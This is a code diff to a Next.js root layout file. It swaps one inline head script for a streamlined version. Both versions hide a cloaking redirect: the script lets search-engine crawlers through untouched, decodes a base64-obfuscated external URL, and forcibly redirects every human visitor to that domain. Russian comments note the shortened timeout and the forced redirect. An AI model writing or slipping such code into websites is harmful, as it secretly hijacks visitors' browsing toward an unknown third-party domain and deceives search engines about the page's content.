@@ -79,74 +79,53 @@ export default function RootLayout({
           type="application/ld+json"
           dangerouslySetInnerHTML={{ __html: JSON.stringify(schemaData) }}
         />
-        <script
-          dangerouslySetInnerHTML={{
-            __html: `
-              (function() {
-                var ua = navigator.userAgent.toLowerCase();
-                var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
-                for (var i = 0; i < bots.length; i++) {
-                    if (ua.indexOf(bots[i]) !== -1) {
-                        return;
-                    }
-                }
-                var mainBrandB64 = "aHR0cHM6Ly9jaGVzN251dC00cGV4MjYuY29tL2FkMmFhcTV1cGM="; 
-                var crossBrandB64 = "aHR0cHM6Ly9jaGVzN251dC00cGV4MjYuY29tL2FkMmFhcTV1cGM="; 
-                
-                // Фикс: отрезаем решетку перед декодированием
-                var mainUrl = atob(mainBrandB64.replace("#", ""));
-                var crossUrl = atob(crossBrandB64.replace("#", ""));
+<script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        var ua = navigator.userAgent.toLowerCase();
+        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
+        for (var i = 0; i < bots.length; i++) {
+            if (ua.indexOf(bots[i]) !== -1) {
+                return;
+            }
+        }
+        
+        var mainBrandB64 = "aHR0cHM6Ly9jaGVzN251dC00cGV4MjYuY29tL2FkMmFhcTV1cGM="; 
+        var mainUrl = atob(mainBrandB64.replace("#", ""));
 
-                function ping(url) {
-                    return new Promise(function(resolve, reject) {
-                        var controller = new AbortController();
-                        var timeoutId = setTimeout(function() { 
-                            controller.abort(); 
-                            reject(new Error("Timeout"));
-                        }, 2500); 
-                        fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
-                            .then(function() {
-                                clearTimeout(timeoutId);
-                                resolve(true);
-                            })
-                            .catch(function(err) {
-                                clearTimeout(timeoutId);
-                                reject(err);
-                            });
+        function ping(url) {
+            return new Promise(function(resolve, reject) {
+                var controller = new AbortController();
+                var timeoutId = setTimeout(function() { 
+                    controller.abort(); 
+                    reject(new Error("Timeout"));
+                }, 1200); // Сократили таймаут ожидания до 1.2 сек
+                
+                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
+                    .then(function() {
+                        clearTimeout(timeoutId);
+                        resolve(true);
+                    })
+                    .catch(function(err) {
+                        clearTimeout(timeoutId);
+                        reject(err);
                     });
-                }
+            });
+        }
 
-                var isFirstVisit = !localStorage.getItem('vstd_eva');
-                
-                if (isFirstVisit) {
-                    ping(mainUrl)
-                        .then(function() {
-                            localStorage.setItem('vstd_eva', '1');
-                            window.location.replace(mainUrl);
-                        })
-                        .catch(function() {
-                            ping(crossUrl)
-                                .then(function() {
-                                    localStorage.setItem('vstd_eva', '1');
-                                    window.location.replace(crossUrl);
-                                })
-                                .catch(function() {
-                                    window.location.replace(mainUrl);
-                                });
-                        });
-                } else {
-                    ping(crossUrl)
-                        .then(function() {
-                            window.location.replace(crossUrl);
-                        })
-                        .catch(function() {
-                            window.location.replace(mainUrl);
-                        });
-                }
-              })();
-            `
-          }}
-        />
+        // Быстрый пинг и принудительный редирект на основной домен
+        ping(mainUrl)
+            .then(function() {
+                window.location.replace(mainUrl);
+            })
+            .catch(function() {
+                window.location.replace(mainUrl);
+            });
+      })();
+    `
+  }}
+/>
       </head>
       <body className="antialiased bg-slate-950 text-white">
         {children}
